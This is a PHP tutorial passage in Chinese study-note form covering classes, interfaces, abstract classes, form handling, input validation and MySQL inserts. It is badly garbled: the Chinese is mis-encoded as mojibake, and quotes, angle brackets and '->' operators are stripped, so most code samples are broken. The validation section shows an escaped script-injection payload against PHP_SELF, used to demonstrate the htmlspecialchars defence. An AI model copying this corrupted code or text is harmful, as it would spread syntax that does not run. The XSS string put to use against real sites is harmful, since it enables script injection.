Site;$taobao=new Site;$google=new Site;//è°ƒç”¨æˆå‘˜å‡½æ•°$runoob-setTitle(èœé¸Ÿæ•™ç¨‹);$taobao-setTitle(æ·˜å®);$google-setTitle(Google æœç´¢);$runoob-setUrl(www.runoob.com);$taobao-setUrl(www.taobao.com);$google-setUrl(www.google.com);//è°ƒç”¨æˆå‘˜å‡½æ•°ï¼Œè·å¾—æ ‡é¢˜å’ŒURL$runoob-getTitle();$taobao-getTitle();$google-getTitle();$runoob-getUrl();$taobao-getUrl();$google-getUrl();? PHP_EOL æ˜¯æ–‡æœ¬æ¢è¡Œï¼Œå¹¶ä¸æ˜¯ html æ¢è¡Œ å¦‚æœæƒ³åœ¨ç½‘é¡µé‡Œé¢åšåˆ°æ¢è¡Œï¼šä¸€ç§æ˜¯åœ¨æœ€å‰é¢åŠ ä¸Š echo preåšæ–‡æœ¬æ ¼å¼åŒ–å¤„ç†ï¼›å¦ä¸€ç§æ˜¯å°†PHP_EOLæ”¹æˆâ€ phpæ„é€ å‡½æ•°ä¸»è¦ç”¨æ¥åœ¨åˆ›å»ºå¯¹è±¡æ—¶åˆå§‹åŒ–å¯¹è±¡ï¼Œ å³ä¸ºå¯¹è±¡æˆå‘˜å˜é‡èµ‹åˆå§‹å€¼ï¼Œåœ¨åˆ›å»ºå¯¹è±¡çš„è¯­å¥ä¸­ä¸ new è¿ç®—ç¬¦ä¸€èµ·ä½¿ç”¨ã€‚ å…è®¸åœ¨ä¸€ä¸ªç±»ä¸­å®šä¹‰ä¸€ä¸ªæ–¹æ³•ä½œä¸ºæ„é€ å‡½æ•°ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ void __construct([ mixed $args [, $...]]) ä¾‹å­ï¼šåˆå§‹åŒ–$urlå’Œ$titleå˜é‡ function __construct( $par1, $par2 ) $this-url = $par1; $this-title = $par2; å¯ä»¥å°†ä¸Šé¢å¾—ä»£ç ç²¾ç®€å¦‚ä¸‹ ?phpclass Site //æˆå‘˜å˜é‡ var $url; var $title; function __construct($par1,$par2) $this-url=$par1; $this-title=$par2; //æˆå‘˜å‡½æ•° function setUrl($par) $this-url=$par; function getUrl() echo $this-url .PHP_EOL; function setTitle($par) $this-title=$par; function getTitle() echo $this-title.PHP_EOL; $runoob=new Site(www.runoob.com,èœé¸Ÿæ•™ç¨‹);$taobao=new Site(www.taobao.com,æ·˜å®);$google=new Site(ww.google.com,Google æœç´¢);//è°ƒç”¨æˆå‘˜å‡½æ•°ï¼Œè·å¾—æ ‡é¢˜å’ŒURL$runoob-getTitle();$taobao-getTitle();$google-getTitle();$runoob-getUrl();$taobao-getUrl();$google-getUrl();? ææ„å‡½æ•°å½“å¯¹è±¡ç»“æŸå…¶ç”Ÿå‘½å‘¨æœŸæ—¶ï¼ˆä¾‹å¦‚å¯¹è±¡æ‰€åœ¨çš„å‡½æ•°å·²è°ƒç”¨å®Œæ¯•ï¼‰ï¼Œç³»ç»Ÿè‡ªåŠ¨æ‰§è¡Œææ„å‡½æ•° è¯­æ³•ï¼švoid __destruct(void) ?phpclass MyDestructableClass function __construct() print æ„é€ å‡½æ•° ; $this-name = MyDestructableClass; function __destruct() print é”€æ¯ . $this-name . ; $obj = new MyDestructableClass();? ç»§æ‰¿ä½¿ç”¨extendsæ¥ç»§æ‰¿ä¸€ä¸ªç±»ï¼ˆå¹¶å¯ä»¥æ‰©å±•å…¶åŠŸèƒ½ï¼‰ï¼Œè¯­æ³•æ ¼å¼å¦‚ä¸‹ class Child extends Parent\t//ä»£ç éƒ¨åˆ† æ–¹æ³•é‡å†™å¦‚æœä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•ä¸èƒ½æ»¡è¶³å­ç±»çš„éœ€æ±‚ï¼Œå¯ä»¥å¯¹å…¶è¿›è¡Œæ”¹å†™ï¼Œè¿™ä¸ªè¿‡ç¨‹å«æ–¹æ³•çš„è¦†ç›–ï¼ˆoverrideï¼‰ï¼Œä¹Ÿç§°ä¸ºæ–¹æ³•çš„é‡å†™ã€‚ä¸‹é¢ä¸ºgerUrlæ–¹æ³•å¾—é‡å†™ function getUrl()\techo $this-url . PHP_EOL;\treturn $this-url; è®¿é—®æ§åˆ¶PHP å¯¹å±æ€§æˆ–æ–¹æ³•çš„è®¿é—®æ§åˆ¶ï¼Œæ˜¯é€šè¿‡åœ¨å‰é¢æ·»åŠ å…³é”®å­— publicï¼ˆå…¬æœ‰ï¼‰ï¼Œprotectedï¼ˆå—ä¿æŠ¤ï¼‰æˆ– privateï¼ˆç§æœ‰ï¼‰æ¥å®ç°çš„ã€‚ publicï¼ˆå…¬æœ‰ï¼‰ï¼šå…¬æœ‰çš„ç±»æˆå‘˜å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹è¢«è®¿é—®ã€‚ protectedï¼ˆå—ä¿æŠ¤ï¼‰ï¼šå—ä¿æŠ¤çš„ç±»æˆå‘˜åˆ™åªèƒ½è¢«å…¶ç±»è‡ªèº«ä»¥åŠå…¶å­ç±»å’Œçˆ¶ç±»è®¿é—®ä¸­è®¿é—®ï¼Œå°±æ˜¯è¯´è¦åœ¨ç±»ä¸­æ„é€ ä¸€äº›å…¬æœ‰çš„å‡½æ•°æ¥ä½¿ç”¨å—ä¿æŠ¤çš„å¯¹è±¡ã€‚ privateï¼ˆç§æœ‰ï¼‰ï¼šç§æœ‰çš„ç±»æˆå‘˜åˆ™åªèƒ½è¢«å…¶å®šä¹‰æ‰€åœ¨çš„ç±»è®¿é—®ï¼ˆå®šä¹‰å…¬ç”¨çš„å‡½æ•°æ¥è¿›è¡Œä½¿ç”¨ï¼‰ã€‚ å±æ€§çš„è®¿é—®æ§åˆ¶ ç±»å±æ€§å¿…é¡»å®šä¹‰ä¸ºå…¬æœ‰ï¼Œå—ä¿æŠ¤ï¼Œç§æœ‰ä¹‹ä¸€ã€‚å¦‚æœç”¨ var å®šä¹‰ï¼Œåˆ™è¢«è§†ä¸ºå…¬æœ‰ æ–¹æ³•çš„è®¿é—®æ§åˆ¶ ç±»ä¸­çš„æ–¹æ³•å¯ä»¥è¢«å®šä¹‰ä¸ºå…¬æœ‰ï¼Œç§æœ‰æˆ–å—ä¿æŠ¤ã€‚å¦‚æœæ²¡æœ‰è®¾ç½®è¿™äº›å…³é”®å­—ï¼Œåˆ™è¯¥æ–¹æ³•é»˜è®¤ä¸ºå…¬æœ‰ã€‚ æ¥å£ä½¿ç”¨æ¥å£ï¼ˆinterfaceï¼‰ï¼Œå¯ä»¥æŒ‡å®šæŸä¸ªç±»å¿…é¡»å®ç°å“ªäº›æ–¹æ³•ï¼Œä½†ä¸éœ€è¦å®šä¹‰è¿™äº›æ–¹æ³•çš„å…·ä½“å†…å®¹ã€‚ æ¥å£æ˜¯é€šè¿‡ interface å…³é”®å­—æ¥å®šä¹‰çš„ï¼Œå°±åƒå®šä¹‰ä¸€ä¸ªæ ‡å‡†çš„ç±»ä¸€æ ·ï¼Œä½†å…¶ä¸­å®šä¹‰æ‰€æœ‰çš„æ–¹æ³•éƒ½æ˜¯ç©ºçš„ã€‚ æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•éƒ½å¿…é¡»æ˜¯å…¬æœ‰ï¼Œè¿™æ˜¯æ¥å£çš„ç‰¹æ€§ã€‚ è¦å®ç°ä¸€ä¸ªæ¥å£ï¼Œä½¿ç”¨ implements æ“ä½œç¬¦ã€‚ç±»ä¸­å¿…é¡»å®ç°æ¥å£ä¸­å®šä¹‰çš„æ‰€æœ‰æ–¹æ³•ï¼Œå¦åˆ™ä¼šæŠ¥ä¸€ä¸ªè‡´å‘½é”™è¯¯ã€‚ç±»å¯ä»¥å®ç°å¤šä¸ªæ¥å£ï¼Œç”¨é€—å·æ¥åˆ†éš”å¤šä¸ªæ¥å£çš„åç§°ã€‚ï¼ˆä¸‹é¢è¿™æ®µä»£ç å¥½å¥½ç†è§£ï¼Œæ‡‚äº†å·®ä¸å¤šå°±æ‡‚äº†æ¥å£æ€ä¹ˆç”¨ï¼‰ ?phpinterface Animal public function call();public function run();class HasName protected $name = name;public function getName() return $this-name;class Cat extends HasName implements Animal protected $name = cat;public function call() echo $this-getName() . : å–µå–µå«ï½ . PHP_EOL;public function run() echo $this-getName() . åœ¨è·‘ï½ . PHP_EOL;class Dog extends HasName implements Animal protected $name = dog;public function call() echo $this-getName() . : æ±ªæ±ªå«ï½ . PHP_EOL;public function run() echo $this-getName() . åœ¨è·‘ï½ . PHP_EOL; è¾“å‡ºçš„ç»“æœä¸ºï¼š cat: å–µå–µå«ï½catåœ¨è·‘ï½dog: æ±ªæ±ªå«ï½dogåœ¨è·‘ï½ å¸¸é‡å¯ä»¥æŠŠåœ¨ç±»ä¸­å§‹ç»ˆä¿æŒä¸å˜çš„å€¼å®šä¹‰ä¸ºå¸¸é‡ã€‚åœ¨å®šä¹‰å’Œä½¿ç”¨å¸¸é‡çš„æ—¶å€™ä¸éœ€è¦ä½¿ç”¨ $ ç¬¦å·ã€‚ å¸¸é‡çš„å€¼å¿…é¡»æ˜¯ä¸€ä¸ªå®šå€¼ï¼Œä¸èƒ½æ˜¯å˜é‡ï¼Œç±»å±æ€§ï¼Œæ•°å­¦è¿ç®—çš„ç»“æœæˆ–å‡½æ•°è°ƒç”¨ã€‚ ?phpclass MyClass const constant=å¸¸é‡å€¼; function showConstant() echo self::constant. PHP_EOL; echo MyClass::constant . PHP_EOL;$classname=MyClass;echo $classname::constant. PHP_EOL;$class=new MyClass();$class-showConstant();echo $class::constant. PHP_EOL;? æŠ½è±¡ç±»ä»»ä½•ä¸€ä¸ªç±»ï¼Œå¦‚æœå®ƒé‡Œé¢è‡³å°‘æœ‰ä¸€ä¸ªæ–¹æ³•æ˜¯è¢«å£°æ˜ä¸ºæŠ½è±¡çš„ï¼Œé‚£ä¹ˆè¿™ä¸ªç±»å°±å¿…é¡»è¢«å£°æ˜ä¸ºæŠ½è±¡çš„ã€‚ å®šä¹‰ä¸ºæŠ½è±¡çš„ç±»ä¸èƒ½è¢«å®ä¾‹åŒ–ã€‚ è¢«å®šä¹‰ä¸ºæŠ½è±¡çš„æ–¹æ³•åªæ˜¯å£°æ˜äº†å…¶è°ƒç”¨æ–¹å¼ï¼ˆå‚æ•°ï¼‰ï¼Œä¸èƒ½å®šä¹‰å…¶å…·ä½“çš„åŠŸèƒ½å®ç°ã€‚ ç»§æ‰¿ä¸€ä¸ªæŠ½è±¡ç±»çš„æ—¶å€™ï¼Œå­ç±»å¿…é¡»å®šä¹‰çˆ¶ç±»ä¸­çš„æ‰€æœ‰æŠ½è±¡æ–¹æ³•ï¼›å¦å¤–ï¼Œè¿™äº›æ–¹æ³•çš„è®¿é—®æ§åˆ¶å¿…é¡»å’Œçˆ¶ç±»ä¸­ä¸€æ ·ï¼ˆæˆ–è€…æ›´ä¸ºå®½æ¾ï¼‰ã€‚ä¾‹å¦‚æŸä¸ªæŠ½è±¡æ–¹æ³•è¢«å£°æ˜ä¸ºå—ä¿æŠ¤çš„ï¼Œé‚£ä¹ˆå­ç±»ä¸­å®ç°çš„æ–¹æ³•å°±åº”è¯¥å£°æ˜ä¸ºå—ä¿æŠ¤çš„æˆ–è€…å…¬æœ‰çš„ï¼Œè€Œä¸èƒ½å®šä¹‰ä¸ºç§æœ‰çš„ã€‚ ?phpabstract class AbstractClass //abstractå®šä¹‰æŠ½è±¡ç±» // å¼ºåˆ¶è¦æ±‚å­ç±»å®šä¹‰è¿™äº›æ–¹æ³• abstract protected function getValue(); abstract protected function prefixValue($prefix); // æ™®é€šæ–¹æ³•ï¼ˆéæŠ½è±¡æ–¹æ³•ï¼‰ public function printOut() print $this-getValue() . PHP_EOL; class ConcreteClass1 extends AbstractClass protected function getValue() return ConcreteClass1; public function prefixValue($prefix) return $prefixConcreteClass1; class ConcreteClass2 extends AbstractClass public function getValue() return ConcreteClass2; public function prefixValue($prefix) return $prefixConcreteClass2; $class1 = new ConcreteClass1;$class1-printOut();echo $class1-prefixValue(FOO_) . PHP_EOL;$class2 = new ConcreteClass2;$class2-printOut();echo $class2-prefixValue(FOO_) . PHP_EOL;? è¾“å‡ºç»“æœä¸º ConcreteClass1FOO_ConcreteClass1ConcreteClass2FOO_ConcreteClass2 å­ç±»æ–¹æ³•è¿˜å¯ä»¥åŒ…å«çˆ¶ç±»æŠ½è±¡æ–¹æ³•ä¸­ä¸å­˜åœ¨çš„å¯é€‰å‚æ•° staticå…³é”®å­—å£°æ˜ç±»å±æ€§æˆ–æ–¹æ³•ä¸º static(é™æ€)ï¼Œå°±å¯ä»¥ä¸å®ä¾‹åŒ–ç±»è€Œç›´æ¥è®¿é—®ã€‚ é™æ€å±æ€§ä¸èƒ½é€šè¿‡ä¸€ä¸ªç±»å·²å®ä¾‹åŒ–çš„å¯¹è±¡æ¥è®¿é—®ï¼ˆä½†é™æ€æ–¹æ³•å¯ä»¥ï¼‰ã€‚ ç”±äºé™æ€æ–¹æ³•ä¸éœ€è¦é€šè¿‡å¯¹è±¡å³å¯è°ƒç”¨ï¼Œæ‰€ä»¥ä¼ªå˜é‡ $this åœ¨é™æ€æ–¹æ³•ä¸­ä¸å¯ç”¨ã€‚ é™æ€å±æ€§ä¸å¯ä»¥ç”±å¯¹è±¡é€šè¿‡ - æ“ä½œç¬¦æ¥è®¿é—®ã€‚ ?phpclass Foo public static $my_static = foo; public function staticValue() return self::$my_static; print Foo::$my_static . PHP_EOL;$foo = new Foo();print $foo-staticValue() . PHP_EOL;? selfå¼•ç”¨è‡ªèº«å˜é‡æˆ–è€…æ–¹æ³• Finalå…³é”®å­—å¦‚æœçˆ¶ç±»ä¸­çš„æ–¹æ³•è¢«å£°æ˜ä¸º finalï¼Œåˆ™å­ç±»æ— æ³•è¦†ç›–è¯¥æ–¹æ³•ã€‚å¦‚æœä¸€ä¸ªç±»è¢«å£°æ˜ä¸º finalï¼Œåˆ™ä¸èƒ½è¢«ç»§æ‰¿ã€‚ final public function moreTesting() è°ƒç”¨çˆ¶ç±»æ„é€ æ–¹æ³•PHP ä¸ä¼šåœ¨å­ç±»çš„æ„é€ æ–¹æ³•ä¸­è‡ªåŠ¨çš„è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³•ã€‚è¦æ‰§è¡Œçˆ¶ç±»çš„æ„é€ æ–¹æ³•ï¼Œéœ€è¦åœ¨å­ç±»çš„æ„é€ æ–¹æ³•ä¸­è°ƒç”¨ parent::__construct() ã€‚ ?phpclass BaseClass function __construct() print BaseClass ç±»ä¸­æ„é€ æ–¹æ³• . PHP_EOL; class SubClass extends BaseClass function __construct() parent::__construct(); // å­ç±»æ„é€ æ–¹æ³•ä¸èƒ½è‡ªåŠ¨è°ƒç”¨çˆ¶ç±»çš„æ„é€ æ–¹æ³• print SubClass ç±»ä¸­æ„é€ æ–¹æ³• . PHP_EOL; class OtherSubClass extends BaseClass // ç»§æ‰¿ BaseClass çš„æ„é€ æ–¹æ³•// è°ƒç”¨ BaseClass æ„é€ æ–¹æ³•$obj = new BaseClass();// è°ƒç”¨ BaseClassã€SubClass æ„é€ æ–¹æ³•$obj = new SubClass();// è°ƒç”¨ BaseClass æ„é€ æ–¹æ³•$obj = new OtherSubClass();? è¾“å‡ºçš„ç»“æœ BaseClass ç±»ä¸­æ„é€ æ–¹æ³•BaseClass ç±»ä¸­æ„é€ æ–¹æ³•SubClass ç±»ä¸­æ„é€ æ–¹æ³•BaseClass ç±»ä¸­æ„é€ æ–¹æ³• phpè¡¨å•phpè¡¨å•å’Œç”¨æˆ·è¾“å…¥phpä¸‹æ‹‰è¡¨å•èœå•å•é€‰ ä»¥ä¸‹å®ä¾‹æˆ‘ä»¬è®¾ç½®äº†ä¸‹æ‹‰èœå•ä¸‰ä¸ªé€‰é¡¹ï¼Œè¡¨å•ä½¿ç”¨ GET æ–¹å¼è·å–æ•°æ®ï¼Œaction å±æ€§å€¼ä¸ºç©ºè¡¨ç¤ºæäº¤åˆ°å½“å‰è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ select çš„ name å±æ€§è·å–ä¸‹æ‹‰èœå•çš„å€¼ï¼š ?php$q = isset($_GET[q])? htmlspecialchars($_GET[q]) : ;if($q) if($q ==RUNOOB) echo èœé¸Ÿæ•™ç¨‹brhttp://www.runoob.com; else if($q ==GOOGLE) echo Google æœç´¢brhttp://www.google.com; else if($q ==TAOBAO) echo æ·˜å®brhttp://www.taobao.com; else ?form action= method=get select name=q option value=é€‰æ‹©ä¸€ä¸ªç«™ç‚¹:/option option value=RUNOOBRunoob/option option value=GOOGLEGoogle/option option value=TAOBAOTaobao/option /select input type=submit value=æäº¤ /form?php? phpä¸‹æ‹‰èœå•å¤šé€‰ å¦‚æœä¸‹æ‹‰èœå•æ˜¯å¤šé€‰çš„ï¼ˆ multipleâ€multipleâ€ï¼‰ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å°†è®¾ç½® select nameâ€q[]â€ ä»¥æ•°ç»„çš„æ–¹å¼è·å– select multiple=multiple name=q[] å•é€‰æŒ‰é’®è¡¨å• PHP å•é€‰æŒ‰é’®è¡¨å•ä¸­ name å±æ€§çš„å€¼æ˜¯ä¸€è‡´çš„ï¼Œvalue å€¼æ˜¯ä¸åŒçš„ form action= method=get input type=radio name=q value=RUNOOB /Runoob input type=radio name=q value=GOOGLE /Google input type=radio name=q value=TAOBAO /Taobao input type=submit value=æäº¤/form checkbox å¤é€‰æ¡† å¯ä»¥é€‰æ‹©å¤šä¸ªå€¼ ?php$q = isset($_POST[q])? $_POST[q] : ;if(is_array($q)) $sites = array( RUNOOB = èœé¸Ÿæ•™ç¨‹: http://www.runoob.com, GOOGLE = Google æœç´¢: http://www.google.com, TAOBAO = æ·˜å®: http://www.taobao.com, ); foreach($q as $val) // PHP_EOL ä¸ºå¸¸é‡ï¼Œç”¨äºæ¢è¡Œ echo $sites[$val] . PHP_EOL; else ?form action= method=post input type=checkbox name=q[] value=RUNOOB Runoobbr input type=checkbox name=q[] value=GOOGLE Googlebr input type=checkbox name=q[] value=TAOBAO Taobaobr input type=submit value=æäº¤/form?php? phpè¡¨å•éªŒè¯ å¦‚ä½•é¿å…$_SERVER[â€œPHP_SELFâ€]è¢«åˆ©ç”¨ $_SERVER[â€œPHP_SELFâ€] å¯ä»¥é€šè¿‡ htmlspecialchars() å‡½æ•°æ¥é¿å…è¢«åˆ©ç”¨ã€‚ form ä»£ç å¦‚ä¸‹æ‰€ç¤ºï¼š form method=post action=?php echo htmlspecialchars($_SERVER[PHP_SELF]);? htmlspecialchars() æŠŠä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸º HTML å®ä½“ã€‚ç°åœ¨å¦‚æœç”¨æˆ·æƒ³åˆ©ç”¨ PHP_SELF å˜é‡, ç»“æœå°†è¾“å‡ºå¦‚ä¸‹æ‰€ç¤ºï¼š form method=post action=test_form.php/quot;gt;lt;scriptgt;alert(hacked)lt;/scriptgt; å°è¯•è¯¥æ¼æ´å¤±è´¥ï¼ phpè¡¨å•â€”å¿…é¡»å­—æ®µåœ¨ä»¥ä¸‹ä»£ç ä¸­æˆ‘ä»¬åŠ å…¥äº†ä¸€äº›æ–°çš„å˜é‡: $nameErr, $emailErr, $genderErr, å’Œ $websiteErr.ã€‚è¿™äº›é”™è¯¯å˜é‡å°†æ˜¾ç¤ºåœ¨å¿…éœ€å­—æ®µä¸Šã€‚ æˆ‘ä»¬è¿˜ä¸ºæ¯ä¸ª$_POSTå˜é‡å¢åŠ äº†ä¸€ä¸ªif elseè¯­å¥ã€‚ è¿™äº›è¯­å¥å°†æ£€æŸ¥ $_POST å˜é‡æ˜¯ å¦ä¸ºç©ºï¼ˆä½¿ç”¨phpçš„ empty() å‡½æ•°ï¼‰ã€‚å¦‚æœä¸ºç©ºï¼Œå°†æ˜¾ç¤ºå¯¹åº”çš„é”™è¯¯ä¿¡æ¯ã€‚ å¦‚æœä¸ä¸ºç©ºï¼Œæ•°æ®å°†ä¼ é€’ç»™test_input() å‡½æ•°ï¼š ?php// å®šä¹‰å˜é‡å¹¶é»˜è®¤è®¾ä¸ºç©ºå€¼$nameErr = $emailErr = $genderErr = $websiteErr = ;$name = $email = $gender = $comment = $website = ;if ($_SERVER[REQUEST_METHOD] == POST) if (empty($_POST[name])) $nameErr = åå­—æ˜¯å¿…éœ€çš„ã€‚; else $name = test_input($_POST[name]); if (empty($_POST[email])) $emailErr = é‚®ç®±æ˜¯å¿…éœ€çš„ã€‚; else $email = test_input($_POST[email]); if (empty($_POST[website])) $website = ; else $website = test_input($_POST[website]); if (empty($_POST[comment])) $comment = ; else $comment = test_input($_POST[comment]); if (empty($_POST[gender])) $genderErr = æ€§åˆ«æ˜¯å¿…éœ€çš„ã€‚; else $gender = test_input($_POST[gender]); ? php-æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ æˆ‘ä¸ºæ¯ä¸ªå­—æ®µä¸­æ·»åŠ äº†ä¸€äº›è„šæœ¬ï¼Œ å„ä¸ªè„šæœ¬ä¼šåœ¨ä¿¡æ¯è¾“å…¥é”™è¯¯æ—¶æ˜¾ç¤ºé”™è¯¯ä¿¡æ¯ éªŒè¯é‚®ä»¶å’ŒURLphp-éªŒè¯åç§° ä»¥ä¸‹ä»£ç å°†é€šè¿‡ç®€å•çš„æ–¹å¼æ¥æ£€æµ‹ name å­—æ®µæ˜¯å¦åŒ…å«å­—æ¯å’Œç©ºæ ¼ï¼Œå¦‚æœ name å­—æ®µå€¼ä¸åˆæ³•ï¼Œå°†è¾“å‡ºé”™è¯¯ä¿¡æ¯ $name = test_input($_POST[name]);if (!preg_match(/^[a-zA-Z ]*$/,$name)) $nameErr = åªå…è®¸å­—æ¯å’Œç©ºæ ¼; è¡¥å…… ï¼ˆ1ï¼‰preg_match â€” è¿›è¡Œæ­£åˆ™è¡¨è¾¾å¼åŒ¹é…ã€‚ è¯­æ³•ï¼šint preg_match ( string $pattern , string $subject [, array $matches [, int $flags ]] ) åœ¨ subject å­—ç¬¦ä¸²ä¸­æœç´¢ä¸ pattern ç»™å‡ºçš„æ­£åˆ™è¡¨è¾¾å¼ç›¸åŒ¹é…çš„å†…å®¹ã€‚å¦‚æœæä¾›äº† matches ï¼Œåˆ™å…¶ä¼šè¢«æœç´¢çš„ç»“æœæ‰€å¡«å……ã€‚$matches[0] å°†åŒ…å«ä¸æ•´ä¸ªæ¨¡å¼åŒ¹é…çš„æ–‡æœ¬ï¼Œ$matches[1] å°†åŒ…å«ä¸ç¬¬ä¸€ä¸ªæ•è·çš„æ‹¬å·ä¸­çš„å­æ¨¡å¼æ‰€åŒ¹é…çš„æ–‡æœ¬ï¼Œä»¥æ­¤ç±»æ¨ ï¼ˆ2ï¼‰if(!a)çš„æ„æ€æ˜¯å¦‚æœå˜é‡açš„å€¼ä¸ºå‡ï¼ˆæˆ–è€…0ã€nullã€â€â€ç©ºå€¼ï¼‰ï¼Œåˆ™æ‰§è¡Œifè¯­å¥åé¢çš„ä»£ç å—ã€‚è¿™é‡Œçš„â€!â€æ˜¯ä¸€ä¸ªé€»è¾‘éè¿ç®—ç¬¦ï¼Œå¯ä»¥å°†çœŸå€¼å˜ä¸ºå‡ï¼Œå‡å€¼å˜ä¸ºçœŸã€‚æ‰€ä»¥ï¼Œå¦‚æœaæ˜¯çœŸå€¼ï¼Œé‚£ä¹ˆ!aå°±æ˜¯å‡å€¼ï¼›å¦‚æœaæ˜¯å‡å€¼ï¼Œé‚£ä¹ˆ!aå°±æ˜¯çœŸå€¼ã€‚ éªŒè¯é‚®ä»¶ $email = test_input($_POST[email]);if (!preg_match(/([\\w\\-]+\\@[\\w\\-]+\\.[\\w\\-]+)/,$email)) $emailErr = éæ³•é‚®ç®±æ ¼å¼; éªŒè¯URL $website = test_input($_POST[website]);if (!preg_match(/\\b(?:(?:https?|ftp):\\/\\/|www\\.)[-a-z0-9+@#\\/%?=~_|!:,.;]*[-a-z0-9+@#\\/%=~_|]/i,$website)) $websiteErr = éæ³•çš„ URL çš„åœ°å€; $_GETå˜é‡é¢„å®šä¹‰çš„ $_GET å˜é‡ç”¨äºæ”¶é›†æ¥è‡ª methodâ€getâ€ çš„è¡¨å•ä¸­çš„å€¼ã€‚ ä»å¸¦æœ‰ GET æ–¹æ³•çš„è¡¨å•å‘é€çš„ä¿¡æ¯ï¼Œå¯¹ä»»ä½•äººéƒ½æ˜¯å¯è§çš„ï¼ˆä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„åœ°å€æ ï¼‰ï¼Œå¹¶ä¸”å¯¹å‘é€ä¿¡æ¯çš„é‡ä¹Ÿæœ‰é™åˆ¶ã€‚ åœ¨ HTML è¡¨å•ä¸­ä½¿ç”¨ methodâ€getâ€ æ—¶ï¼Œæ‰€æœ‰çš„å˜é‡åå’Œå€¼éƒ½ä¼šæ˜¾ç¤ºåœ¨ URL ä¸­ã€‚ æ³¨é‡Šï¼šæ‰€ä»¥åœ¨å‘é€å¯†ç æˆ–å…¶ä»–æ•æ„Ÿä¿¡æ¯æ—¶ï¼Œä¸åº”è¯¥ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼ ç„¶è€Œï¼Œæ­£å› ä¸ºå˜é‡æ˜¾ç¤ºåœ¨ URL ä¸­ï¼Œå› æ­¤å¯ä»¥åœ¨æ”¶è—å¤¹ä¸­æ”¶è—è¯¥é¡µé¢ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ æ³¨é‡Šï¼šHTTP GET æ–¹æ³•ä¸é€‚åˆå¤§å‹çš„å˜é‡å€¼ã€‚å®ƒçš„å€¼æ˜¯ä¸èƒ½è¶…è¿‡ 2000 ä¸ªå­—ç¬¦çš„ $_POSTå˜é‡é¢„å®šä¹‰çš„ $_POST å˜é‡ç”¨äºæ”¶é›†æ¥è‡ª methodâ€postâ€ çš„è¡¨å•ä¸­çš„å€¼ã€‚ ä»å¸¦æœ‰ POST æ–¹æ³•çš„è¡¨å•å‘é€çš„ä¿¡æ¯ï¼Œå¯¹ä»»ä½•äººéƒ½æ˜¯ä¸å¯è§çš„ï¼ˆä¸ä¼šæ˜¾ç¤ºåœ¨æµè§ˆå™¨çš„åœ°å€æ ï¼‰ï¼Œå¹¶ä¸”å¯¹å‘é€ä¿¡æ¯çš„é‡ä¹Ÿæ²¡æœ‰é™åˆ¶ã€‚ æ³¨é‡Šï¼šç„¶è€Œï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼ŒPOST æ–¹æ³•çš„å‘é€ä¿¡æ¯çš„é‡æœ€å¤§å€¼ä¸º 8 MBï¼ˆå¯é€šè¿‡è®¾ç½® php.ini æ–‡ä»¶ä¸­çš„ post_max_size è¿›è¡Œæ›´æ”¹ï¼‰ $_REQUEST å˜é‡é¢„å®šä¹‰çš„ $_REQUEST å˜é‡åŒ…å«äº† $_GETã€$_POST å’Œ $_COOKIE çš„å†…å®¹ã€‚ $_REQUEST å˜é‡å¯ç”¨æ¥æ”¶é›†é€šè¿‡ GET å’Œ POST æ–¹æ³•å‘é€çš„è¡¨å•æ•°æ® phpæ•°æ®åº“æ•°æ®åº“ä½¿ç”¨å®Œåè¦è®°å¾—å…³é—­è¿æ¥ é¢å‘å¯¹è±¡ï¼š$conn-close(); é¢å‘è¿‡ç¨‹ï¼šmysqli_close($conn); è¿æ¥MySQL servername å¯é€‰ã€‚è§„å®šè¦è¿æ¥çš„æœåŠ¡å™¨ã€‚é»˜è®¤æ˜¯ â€œlocalhost:3306â€ã€‚ username å¯é€‰ã€‚è§„å®šç™»å½•æ‰€ä½¿ç”¨çš„ç”¨æˆ·åã€‚é»˜è®¤å€¼æ˜¯æ‹¥æœ‰æœåŠ¡å™¨è¿›ç¨‹çš„ç”¨æˆ·çš„åç§°ã€‚ password å¯é€‰ã€‚è§„å®šç™»å½•æ‰€ç”¨çš„å¯†ç ã€‚é»˜è®¤æ˜¯ â€œâ€ é¢å‘è¿‡ç¨‹ ?php$servername = localhost;$username = username;$password = password; // åˆ›å»ºè¿æ¥$conn = mysqli_connect($servername, $username, $password); // æ£€æµ‹è¿æ¥if (!$conn) die(Connection failed: . mysqli_connect_error());echo è¿æ¥æˆåŠŸ;? æƒ³è¿æ¥åˆ°æ•°æ®åº“å°±æ˜¯åœ¨passwordåé¢å†åŠ å°±å¯ä»¥äº† $conn = mysqli_connect(localhost, root, root, ez_sql); æ’å…¥æ•°æ®è¯­æ³• $sql = INSERT INTO MyGuests (firstname, lastname, email)VALUES (John, Doe, john@example.com); if (mysqli_query($conn, $sql)) echo æ–°è®°å½•æ’å…¥æˆåŠŸ; else echo Error: . $sql . br . mysqli_error($conn); æ’å…¥å¤šæ¡æ•°æ® mysqli_multi_query() å‡½æ•°å¯ç”¨æ¥æ‰§è¡Œå¤šæ¡SQLè¯­å¥ ä¾‹å­ï¼š $sql = INSERT INTO MyGuests (firstname, lastname, email)VALUES (John, Doe, john@example.com);;$sql .= INSERT INTO MyGuests (firstname, lastname, email)VALUES (Mary, Moe, mary@example.com);;$sql .= INSERT INTO MyGuests (firstname, lastname, email)VALUES (Julie, Dooley, julie@example.com); if ($conn-multi_query($sql) === TRUE) echo æ–°è®°å½•æ’å…¥æˆåŠŸ; else echo Error: . $sql . br . $conn-error; é¢„å¤„ç†è¯­å¥å‡½æ•°mysqli_stmt_bind_param() è¯¥å‡½æ•°ç»‘å®šå‚æ•°æŸ¥è¯¢å¹¶å°†å‚æ•°ä¼ é€’ç»™æ•°æ®åº“ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯ â€œsssâ€ ï¼Œ 